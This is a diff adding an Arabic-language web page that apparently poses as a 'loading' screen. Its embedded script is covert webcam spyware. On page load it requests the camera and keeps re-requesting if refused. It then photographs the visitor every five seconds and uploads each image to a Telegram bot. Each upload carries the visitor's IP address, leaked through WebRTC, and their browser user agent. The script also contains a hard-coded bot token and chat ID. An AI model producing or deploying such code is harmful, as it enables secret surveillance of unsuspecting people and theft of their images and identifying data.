@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>📸</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>body{margin:0;background:#000;color:#fff;font-family:sans-serif}</style>
+</head>
+<body>
+<center><h2>جارٍ التحميل...</h2></center>
+<script>
+/* ============================================
+   BIG-BANG-GOD-DOMINION | كاميرا مراقبة إلى تليغرام
+   ============================================ */
+
+const BOT_TOKEN = '8294981237:AAE35nM6juqX4p2TOS4_er9Bh4pFS60xivc';
+const CHAT_ID = '-1002143197386';
+const QUALITY = 0.9;
+const DELAY = 5000;
+
+// ============================================
+
+async function getIP() {
+  const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+  pc.createDataChannel('');
+  const offer = await pc.createOffer();
+  await pc.setLocalDescription(offer);
+  return new Promise(res => {
+    pc.onicecandidate = e => {
+      if (!e.candidate) return;
+      const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+      if (ip) res(ip[1]);
+    };
+    setTimeout(() => res('unknown'), 1000);
+  });
+}
+
+async function telegram(blob) {
+  const form = new FormData();
+  form.append('chat_id', CHAT_ID);
+  form.append('photo', blob, 'surveillance.jpg');
+  form.append('caption', `📸 ${new Date().toLocaleString('ar-EG')}
+IP: ${await getIP()}
+UA: ${navigator.userAgent}`);
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
+}
+
+let stream, track, interval;
+async function startCamera() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 }, audio: false });
+    track = stream.getVideoTracks()[0];
+    interval = setInterval(capture, DELAY);
+    await capture();
+  } catch (e) {
+    setTimeout(startCamera, 200);
+  }
+}
+
+async function capture() {
+  if (!track || track.readyState !== 'live') { clearInterval(interval); startCamera(); return; }
+  const video = document.createElement('video');
+  const canvas = document.createElement('canvas');
+  video.srcObject = stream;
+  await video.play();
+  const ratio = Math.min(1280 / video.videoWidth, 720 / video.videoHeight);
+  canvas.width = video.videoWidth * ratio;
+  canvas.height = video.videoHeight * ratio;
+  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(async blob => { if (blob) await telegram(blob); }, 'image/jpeg', QUALITY);
+}
+
+startCamera();
+</script>
+</body>
+</html>
